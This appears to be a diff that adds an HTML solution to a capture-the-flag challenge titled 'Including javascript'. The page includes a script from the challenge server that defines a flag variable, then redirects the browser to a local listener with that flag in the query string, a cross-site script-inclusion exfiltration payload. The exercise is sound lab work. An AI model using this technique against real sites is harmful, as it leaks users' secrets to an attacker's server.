@@ -1,0 +1,13 @@
+<!DOCTYPE HTML>
+<!-- "Including javascript" challenge.
+first: get a webserver going 'python3 -m http.server 8000' (<--- the number doesn't matter as long as it's not 0-1023, which are reserved)
+Then run thee /challenge/server and /challenge/client.
+ExplanationL the first script will source from the one set by the challenge server which sets a flag variable. The 2nd attempts to redirect with the flag in the get request (probably don't need the html and head tags)-->
+<html>
+	<head>
+		<script src='http://challenge.localhost:80/meet'></script>
+		<script>
+			window.location.href = `http://localhost:8000/?the_flag_is=${flag}`
+		</script>
+	</head>
+</html>
